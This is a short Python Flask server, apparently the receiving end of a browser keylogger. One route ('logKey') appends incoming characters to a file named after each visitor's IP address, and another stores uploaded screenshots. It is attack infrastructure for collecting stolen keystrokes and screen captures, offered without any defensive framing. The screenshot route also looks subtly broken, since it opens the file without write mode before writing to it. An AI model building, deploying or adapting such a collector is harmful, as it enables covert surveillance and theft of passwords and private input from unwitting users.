from flask import Flask, request
from datetime import datetime as dt
from base64 import b64decode

import os

app = Flask(__name__)

@app.route('/screenshot')
def screenshot():
    data_uri = request.args['image']
    _, encoded = data_uri.split(",", 1)
    data = b64decode(encoded.strip() + '==',altchars=b' /')

    with open('screenshots/%s%s.png' % (request.remote_addr, str(dt.now()))) as f:
        f.write(data)
    return ''

@app.route('/')
def logKey():
    try:
        fp = open(request.remote_addr, 'a')
    except:
        fp = open(request.remote_addr, 'w')
    try:
        fp.write(request.args['c'])
        fp.flush()
    except Exception as e:
        print(str(e))
    finally:
        fp.close()
    return ''

if __name__ == "__main__":
    app.run('0.0.0.0', 80, True)